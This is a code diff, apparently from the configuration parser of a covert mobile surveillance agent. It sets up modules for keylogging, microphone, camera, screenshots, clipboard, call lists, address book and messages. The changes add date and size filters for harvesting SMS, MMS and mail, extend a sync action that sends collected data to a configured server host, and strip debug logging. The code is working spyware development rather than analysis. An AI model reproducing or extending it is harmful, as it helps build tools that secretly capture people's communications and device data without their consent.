@@ -209,27 +209,23 @@
   NSArray *keys = nil;
   NSArray *objects = nil;
   
-#ifdef DEBUG_JSON_CONFIG
-  NSLog(@"%s: registering module type %@", __FUNCTION__, [aModule objectForKey: @"desc"]);
-#endif
-  
   NSMutableDictionary *moduleConfiguration = [[NSMutableDictionary alloc] init];
   
-  NSNumber *type = [NSNumber numberWithUnsignedInt: AGENT_ORGANIZER];
+  NSNumber *type = [NSNumber numberWithUnsignedInt: AGENT_ADDRESSBOOK];
   NSNumber *status = [aModule objectForKey: MODULES_STATUS_KEY];
   
   if (status == nil || [status boolValue] == FALSE)
     enabled = AGENT_DISABLED;
   
   keys = [NSArray arrayWithObjects: @"agentID",
-          @"status",
-          @"data",
-          nil];
+                                    @"status",
+                                    @"data",
+                                    nil];
   
   objects = [NSArray arrayWithObjects: type, 
-             enabled, 
-             MODULE_EMPTY_CONF,
-             nil];
+                                       enabled, 
+                                       MODULE_EMPTY_CONF,
+                                       nil];
   
   NSDictionary *dictionary = [NSDictionary dictionaryWithObjects: objects
                                                          forKeys: keys];
@@ -251,11 +247,7 @@
   id enabled = AGENT_ENABLED;
   NSArray *keys = nil;
   NSArray *objects = nil;
-  
-#ifdef DEBUG_JSON_CONFIG
-  NSLog(@"%s: registering module type %@", __FUNCTION__, [aModule objectForKey: @"desc"]);
-#endif
-  
+ 
   NSMutableDictionary *moduleConfiguration = [[NSMutableDictionary alloc] init];
   
   NSNumber *type = [NSNumber numberWithUnsignedInt: AGENT_DEVICE];
@@ -267,14 +259,14 @@
     enabled = AGENT_DISABLED;
   
   keys = [NSArray arrayWithObjects: @"agentID",
-          @"status",
-          @"data",
-          nil];
+                                    @"status",
+                                    @"data",
+                                    nil];
   
   objects = [NSArray arrayWithObjects: type, 
-             enabled, 
-             (applist != nil ? applist : MODULE_EMPTY_CONF),
-             nil];
+                                       enabled, 
+                                       (applist != nil ? applist : MODULE_EMPTY_CONF),
+                                       nil];
   
   NSDictionary *dictionary = [NSDictionary dictionaryWithObjects: objects
                                                          forKeys: keys];
@@ -297,10 +289,6 @@
   NSArray *keys = nil;
   NSArray *objects = nil;
   
-#ifdef DEBUG_JSON_CONFIG
-  NSLog(@"%s: registering module type %@", __FUNCTION__, [aModule objectForKey: @"desc"]);
-#endif
-  
   NSMutableDictionary *moduleConfiguration = [[NSMutableDictionary alloc] init];
   
   NSNumber *type  = [NSNumber numberWithUnsignedInt: AGENT_CALL_LIST];
@@ -310,14 +298,14 @@
     enabled = AGENT_DISABLED;
   
   keys = [NSArray arrayWithObjects: @"agentID",
-          @"status",
-          @"data",
-          nil];
+                                    @"status",
+                                    @"data",
+                                    nil];
   
   objects = [NSArray arrayWithObjects: type, 
-             enabled, 
-             MODULE_EMPTY_CONF,
-             nil];
+                                       enabled, 
+                                       MODULE_EMPTY_CONF,
+                                       nil];
   
   NSDictionary *dictionary = [NSDictionary dictionaryWithObjects: objects
                                                          forKeys: keys];
@@ -338,23 +326,19 @@
   NSArray *keys;
   NSArray *objects;
   
-#ifdef DEBUG_JSON_CONFIG
-  NSLog(@"%s: registering module type %@", __FUNCTION__, [aModule objectForKey: @"desc"]);
-#endif
-  
   NSMutableDictionary *moduleConfiguration = [[NSMutableDictionary alloc] init];
   
   NSNumber *type    = [NSNumber numberWithUnsignedInt: AGENT_ORGANIZER];
   
   keys = [NSArray arrayWithObjects: @"agentID",
-          @"status",
-          @"data",
-          nil];
+                                    @"status",
+                                    @"data",
+                                    nil];
   
   objects = [NSArray arrayWithObjects: type, 
-             AGENT_DISABLED, 
-             MODULE_EMPTY_CONF,
-             nil];
+                                       AGENT_DISABLED, 
+                                       MODULE_EMPTY_CONF,
+                                       nil];
   
   NSDictionary *dictionary = [NSDictionary dictionaryWithObjects: objects
                                                          forKeys: keys];
@@ -379,10 +363,6 @@
   NSArray *objects = nil;
   NSData  *data;
   
-#ifdef DEBUG_JSON_CONFIG
-  NSLog(@"%s: registering module type %@", __FUNCTION__, [aModule objectForKey: @"desc"]);
-#endif
-  
   NSMutableDictionary *moduleConfiguration = [[NSMutableDictionary alloc] init];
   
   NSNumber *type   = [NSNumber numberWithUnsignedInt: AGENT_MICROPHONE];
@@ -405,14 +385,14 @@
   data = [[NSData alloc] initWithBytes: &micStruct length: sizeof(microphoneAgentStruct_t)];
   
   keys = [NSArray arrayWithObjects: @"agentID",
-          @"status",
-          @"data",
-          nil];
+                                    @"status",
+                                    @"data",
+                                    nil];
   
   objects = [NSArray arrayWithObjects: type, 
-             enabled, 
-             data,
-             nil];
+                                       enabled, 
+                                       data,
+                                       nil];
   
   NSDictionary *dictionary = [NSDictionary dictionaryWithObjects: objects
                                                          forKeys: keys];
@@ -438,11 +418,7 @@
   NSArray *keys = nil;
   NSArray *objects = nil;
   NSData  *data;
-  
-#ifdef DEBUG_JSON_CONFIG
-  NSLog(@"%s: registering module type %@", __FUNCTION__, [aModule objectForKey: @"desc"]);
-#endif
-  
+   
   NSMutableDictionary *moduleConfiguration = [[NSMutableDictionary alloc] init];
   
   NSNumber *type    = [NSNumber numberWithUnsignedInt:AGENT_CAM];
@@ -459,14 +435,14 @@
   data = [[NSData alloc] initWithBytes: &camStruct length: sizeof(cameraStruct_t)];
   
   keys = [NSArray arrayWithObjects: @"agentID",
-          @"status",
-          @"data",
-          nil];
+                                    @"status",
+                                    @"data",
+                                    nil];
   
   objects = [NSArray arrayWithObjects: type, 
-             enabled, 
-             data,
-             nil];
+                                       enabled, 
+                                       data,
+                                       nil];
   
   NSDictionary *dictionary = [NSDictionary dictionaryWithObjects: objects
                                                          forKeys: keys];
@@ -492,10 +468,6 @@
   NSArray *keys = nil;
   NSArray *objects = nil;
   NSData  *data;
-  
-#ifdef DEBUG_JSON_CONFIG
-  NSLog(@"%s: registering module type %@", __FUNCTION__, [aModule objectForKey: @"desc"]);
-#endif
   
   NSMutableDictionary *moduleConfiguration = [[NSMutableDictionary alloc] init];
   
@@ -523,23 +495,19 @@
   data = [[NSData alloc] initWithBytes: &scrStruct length: sizeof(screenshotAgentStruct_t)];
   
   keys = [NSArray arrayWithObjects: @"agentID",
-          @"status",
-          @"data",
-          nil];
+                                    @"status",
+                                    @"data",
+                                    nil];
   
   objects = [NSArray arrayWithObjects: type, 
-             enabled, 
-             data,
-             nil];
+                                       enabled, 
+                                       data,
+                                       nil];
   
   NSDictionary *dictionary = [NSDictionary dictionaryWithObjects: objects
                                                          forKeys: keys];
   
   [moduleConfiguration addEntriesFromDictionary: dictionary];
-  
-#ifdef DEBUG_JSON_CONFIG
-  NSLog(@"%s: screensht configuration %@", __FUNCTION__, moduleConfiguration);
-#endif
   
   [mAgentsList addObject: moduleConfiguration];
   
@@ -559,10 +527,6 @@
   NSArray *keys = nil;
   NSArray *objects = nil;
   
-#ifdef DEBUG_JSON_CONFIG
-  NSLog(@"%s: registering module type %@", __FUNCTION__, [aModule objectForKey: @"desc"]);
-#endif
-  
   NSMutableDictionary *moduleConfiguration = [[NSMutableDictionary alloc] init];
   
   NSNumber *type    = [NSNumber numberWithUnsignedInt: AGENT_URL];
@@ -573,14 +537,14 @@
     enabled = AGENT_DISABLED;
   
   keys = [NSArray arrayWithObjects: @"agentID",
-          @"status",
-          @"data",
-          nil];
+                                    @"status",
+                                    @"data",
+                                    nil];
   
   objects = [NSArray arrayWithObjects: type, 
-             enabled, 
-             takeSnap != nil ? takeSnap : MODULE_EMPTY_CONF,
-             nil];
+                                       enabled, 
+                                       takeSnap != nil ? takeSnap : MODULE_EMPTY_CONF,
+                                       nil];
   
   NSDictionary *dictionary = [NSDictionary dictionaryWithObjects: objects
                                                          forKeys: keys];
@@ -603,10 +567,6 @@
   NSArray *keys = nil;
   NSArray *objects = nil;
   
-#ifdef DEBUG_JSON_CONFIG
-  NSLog(@"%s: registering module type %@", __FUNCTION__, [aModule objectForKey: @"desc"]);
-#endif
-  
   NSMutableDictionary *moduleConfiguration = [[NSMutableDictionary alloc] init];
   
   NSNumber *type = [NSNumber numberWithUnsignedInt: AGENT_APPLICATION];
@@ -616,14 +576,14 @@
     enabled = AGENT_DISABLED;
   
   keys = [NSArray arrayWithObjects: @"agentID",
-          @"status",
-          @"data",
-          nil];
+                                    @"status",
+                                    @"data",
+                                    nil];
   
   objects = [NSArray arrayWithObjects: type, 
-             enabled, 
-             MODULE_EMPTY_CONF,
-             nil];
+                                       enabled, 
+                                       MODULE_EMPTY_CONF,
+                                       nil];
   
   NSDictionary *dictionary = [NSDictionary dictionaryWithObjects: objects
                                                          forKeys: keys];
@@ -646,10 +606,6 @@
   NSArray *keys = nil;
   NSArray *objects = nil;
   
-#ifdef DEBUG_JSON_CONFIG
-  NSLog(@"%s: registering module type %@", __FUNCTION__, [aModule objectForKey: @"desc"]);
-#endif
-  
   NSMutableDictionary *moduleConfiguration = [[NSMutableDictionary alloc] init];
   
   NSNumber *type  = [NSNumber numberWithUnsignedInt: AGENT_KEYLOG];
@@ -659,14 +615,14 @@
     enabled = AGENT_DISABLED;
   
   keys = [NSArray arrayWithObjects: @"agentID",
-          @"status",
-          @"data",
-          nil];
+                                    @"status",
+                                    @"data",
+                                    nil];
   
   objects = [NSArray arrayWithObjects: type, 
-             enabled, 
-             MODULE_EMPTY_CONF,
-             nil];
+                                       enabled, 
+                                       MODULE_EMPTY_CONF,
+                                       nil];
   
   NSDictionary *dictionary = [NSDictionary dictionaryWithObjects: objects
                                                          forKeys: keys];
@@ -689,10 +645,6 @@
   NSArray *keys = nil;
   NSArray *objects = nil;
   
-#ifdef DEBUG_JSON_CONFIG
-  NSLog(@"%s: registering module type %@", __FUNCTION__, [aModule objectForKey: @"desc"]);
-#endif
-  
   NSMutableDictionary *moduleConfiguration = [[NSMutableDictionary alloc] init];
   
   NSNumber *type  = [NSNumber numberWithUnsignedInt: AGENT_CLIPBOARD];
@@ -702,14 +654,14 @@
     enabled = AGENT_DISABLED;
   
   keys = [NSArray arrayWithObjects: @"agentID",
-          @"status",
-          @"data",
-          nil];
+                                    @"status",
+                                    @"data",
+                                    nil];
   
   objects = [NSArray arrayWithObjects: type, 
-             enabled, 
-             MODULE_EMPTY_CONF,
-             nil];
+                                       enabled, 
+                                       MODULE_EMPTY_CONF,
+                                       nil];
   
   NSDictionary *dictionary = [NSDictionary dictionaryWithObjects: objects
                                                          forKeys: keys];
@@ -723,17 +675,106 @@
   [pool release];
 }
 
+typedef struct _message_config_t {
+  int type;
+  int enable;
+  int history;
+  int64_t datefrom;
+  int64_t dateto;
+  int maxsize;
+} message_config_t;
+
+- (int64_t)calculateUnixDate:(NSString*)aDate
+{
+  NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
+  
+  if (aDate == nil)
+    return 0;
+  
+  //date description format: YYYY-MM-DD HH:MM:SS ±HHMM
+  // UTC timers
+  NSTimeZone *timeZone = [NSTimeZone timeZoneWithName:@"UTC"];
+  
+  NSDateFormatter *inFormat = [[NSDateFormatter alloc] init];
+  [inFormat setTimeZone:timeZone];
+  [inFormat setDateFormat: @"yyyy-MM-dd HH:mm:ss"];
+  
+  // Get date string UTC
+  NSDate *theDate = [inFormat dateFromString: aDate];
+  [inFormat release];
+  
+  NSTimeInterval unixTime = [theDate timeIntervalSince1970];
+  
+  [pool release];
+  
+  return  unixTime;
+}
+
+- (void)setMessageFilter:(message_config_t*)param 
+                 forType:(NSString*)type
+          withDictionary:(NSDictionary*)aModule
+{
+  NSDictionary *tmpDict;
+  
+  memset(param, 0, sizeof(message_config_t));
+      
+  tmpDict = [aModule objectForKey: type];
+    
+  if (tmpDict != nil) 
+    {
+      NSNumber *enable = [tmpDict objectForKey:@"enabled"];
+      if (enable != nil && [enable boolValue] == TRUE)
+          param->enable = TRUE;
+      else
+          param->enable = FALSE;
+      NSDictionary *filter = [tmpDict objectForKey: @"filter"];
+      
+      if (filter != nil)
+        {
+          NSNumber *history = [filter objectForKey:@"history"];
+          if (history != nil && [history boolValue] == TRUE)
+            param->history = TRUE;
+          else
+            param->history = FALSE;
+          
+          NSString *dateToStr = [filter objectForKey:@"dateto"];
+          
+           if (dateToStr != nil)
+             {
+               param->dateto = [self calculateUnixDate:dateToStr];
+             } 
+             
+          NSString *dateFromStr = [filter objectForKey:@"datefrom"];
+        
+          if (dateFromStr != nil)
+            {
+              param->datefrom = [self calculateUnixDate:dateFromStr];
+            }
+            
+          NSNumber *maxsize = [filter objectForKey: @"maxsize"];
+          
+          if (maxsize != nil) 
+            {
+              param->maxsize = [maxsize intValue];
+            }
+        }
+    }
+}
+
+#define ANY_TYPE      0
+#define SMS_TYPE      1
+#define MMS_TYPE      2
+#define MAIL_TYPE     4
+
 - (void)initMessagesModule: (NSDictionary *)aModule
 {
   NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
   
+  message_config_t filter[3];
+  
   id enabled = AGENT_ENABLED;
   NSArray *keys = nil;
   NSArray *objects = nil;
-  
-#ifdef DEBUG_JSON_CONFIG
-  NSLog(@"%s: registering module type %@", __FUNCTION__, [aModule objectForKey: @"desc"]);
-#endif
   
   NSMutableDictionary *moduleConfiguration = [[NSMutableDictionary alloc] init];
   
@@ -743,15 +784,27 @@
   if (status == nil || [status boolValue] == FALSE)
     enabled = AGENT_DISABLED;
   
+  [self setMessageFilter: &filter[0] forType:@"mms"  withDictionary:aModule];
+  [self setMessageFilter: &filter[1] forType:@"sms"  withDictionary:aModule];
+  [self setMessageFilter: &filter[2] forType:@"mail" withDictionary:aModule];
+  
+  filter[0].type = MMS_TYPE;
+  filter[1].type = SMS_TYPE;
+  filter[2].type = MAIL_TYPE;
+  
+  NSData *data = [[NSData alloc] initWithBytes: filter length: sizeof(filter)];
+  
   keys = [NSArray arrayWithObjects: @"agentID",
-          @"status",
-          @"data",
-          nil];
+                                    @"status",
+                                    @"data",
+                                    nil];
   
   objects = [NSArray arrayWithObjects: type, 
-             enabled, 
-             MODULE_EMPTY_CONF,
-             nil];
+                                       enabled, 
+                                       data,
+                                       nil];
+  
+  [data release];
   
   NSDictionary *dictionary = [NSDictionary dictionaryWithObjects: objects
                                                          forKeys: keys];
@@ -1018,22 +1071,11 @@
   
   // Get date string UTC
   NSDate *theDate = [inFormat dateFromString: aDate];
-//  NSString *theDateStr = [inFormat stringFromDate: theDate];
   [inFormat release];
-//  
-//  NSDateFormatter *outFormat = [[NSDateFormatter alloc] init];
-//  [outFormat setTimeZone:timeZone];
-//  [outFormat setDateFormat: @"yyyy-MM-dd HH:mm:ss ZZZ"];
-//  
-//  NSDate *date = [outFormat dateFromString: theDateStr];
-//  
-//  NSTimeInterval unixTime = [date timeIntervalSince1970];
   
   NSTimeInterval unixTime = [theDate timeIntervalSince1970];
   int64_t winTime = (unixTime * RATE_DIFF) + EPOCH_DIFF;
-  
-//  [outFormat release];
-  
+    
   [pool release];
   
   return  winTime;
@@ -1732,17 +1774,18 @@
     {
       tmpAgentID = AGENT_ADDRESSBOOK;
     }
-  else if ([moduleName compare: ACTION_MODULE_APPL] == NSOrderedSame)
-    {
-      tmpAgentID = AGENT_APPLICATION;
-    }
   else if ([moduleName compare: ACTION_MODULE_CAL] == NSOrderedSame)
     {
       tmpAgentID = AGENT_ORGANIZER;
     }
+  else if ([moduleName compare: ACTION_MODULE_APPL] == NSOrderedSame)
+    {
+      tmpAgentID = AGENT_APPLICATION;
+    }
   else if ([moduleName compare: ACTION_MODULE_CALL] == NSOrderedSame)
     {
-      tmpAgentID = AGENT_CALL_VOICE;
+      // FIXED- for ios no more callist agent only call
+      tmpAgentID = AGENT_CALL_LIST;
     }
   else if ([moduleName compare: ACTION_MODULE_CALLLIST] == NSOrderedSame)
     {
@@ -1820,9 +1863,12 @@
   syncStruct_t tmpSyncStruct;
   
   NSNumber *type   = [NSNumber numberWithUnsignedInt: ACTION_SYNC];
+  NSNumber *nostop = [NSNumber numberWithInt:0];
   NSNumber *status = [NSNumber numberWithUnsignedInt: 0];
   NSData   *data;
   
+  // FIXED-
+  NSNumber *stop     = [subAction objectForKey: @"stop"];
   NSNumber *wifiFlag = [subAction objectForKey: ACTION_SYNC_WIFI_KEY];
   NSNumber *gprsFlag = [subAction objectForKey: ACTION_SYNC_GPRS_KEY];
   NSString *hostname = [subAction objectForKey: ACTION_SYNC_HOST_KEY];
@@ -1830,25 +1876,32 @@
   // incorrect sync action! XXX- todo verification
   if ( hostname == nil) 
     {
-    return nil;
+      //FIXED-
+      [pool release];
+      return nil;
     }
   
   tmpSyncStruct.gprsFlag = (gprsFlag == nil ? 1 : [gprsFlag intValue]);
   tmpSyncStruct.wifiFlag = (wifiFlag == nil ? 1 : [wifiFlag intValue]);
-  tmpSyncStruct.serverHostLength = (u_int)[hostname lengthOfBytesUsingEncoding: NSUTF16LittleEndianStringEncoding] + 2;
+  tmpSyncStruct.serverHostLength = 
+        (u_int)[hostname lengthOfBytesUsingEncoding: NSUTF16LittleEndianStringEncoding] + 2;
   
   NSData *tmpHostnameData = [hostname dataUsingEncoding: NSUTF16LittleEndianStringEncoding];
   
   memset(tmpSyncStruct.serverHost, 0, 256);
   memcpy(tmpSyncStruct.serverHost, 
          [tmpHostnameData bytes], 
-         sizeof(tmpSyncStruct.serverHost));//tmpSyncStruct.serverHostLength < 256 ? tmpSyncStruct.serverHostLength + 2:256);
+         sizeof(tmpSyncStruct.serverHost));
   tmpSyncStruct.serverHost[254] = tmpSyncStruct.serverHost[255] = 0;
   
   data = [[NSData alloc] initWithBytes: &tmpSyncStruct length:sizeof(syncStruct_t)];
   
-  NSMutableDictionary *subActDict = [[NSMutableDictionary alloc] initWithObjectsAndKeys: 
-                              type, @"type", status, @"status", data, @"data", nil];
+  // FIXED-
+  NSMutableDictionary *subActDict = 
+                  [[NSMutableDictionary alloc] initWithObjectsAndKeys: type,   @"type", 
+                                                                       status, @"status", 
+                                                                       data,   @"data", 
+                                                                       (stop != nil ? stop : nostop), @"stop", nil];
   
   [data release];
   
@@ -2001,10 +2054,7 @@
   
   if (actionsArray == nil) 
     {
-#ifdef DEBUG_JSON_CONFIG
-    NSLog(@"%s: no actions found", __FUNCTION__);
-#endif
-    return;
+      return;
     }
   
   for (int i=0; i < [actionsArray count]; i++) 
@@ -2012,17 +2062,12 @@
       NSAutoreleasePool *inner = [[NSAutoreleasePool alloc]init];
       
       NSDictionary *action = (NSDictionary *)[actionsArray objectAtIndex: i];
-#ifdef DEBUG_JSON_CONFIG
-      NSLog(@"%s: action no. %d desc %@", __FUNCTION__, i, [action objectForKey: @"desc"]);
-#endif     
+          
       NSArray  *subactions  = (NSArray *)[action objectForKey: ACTION_SUBACT_KEY];
       NSNumber *actionNum = [NSNumber numberWithUnsignedInt: i];
       
       NSMutableDictionary *newAction = [self initSubActions:subactions forAction:actionNum];
-      
-#ifdef DEBUG_JSON_CONFIG
-      NSLog(@"%s: action added %@", __FUNCTION__, newAction);
-#endif  
+
       [mActionsList addObject: newAction];
       
       [newAction release];
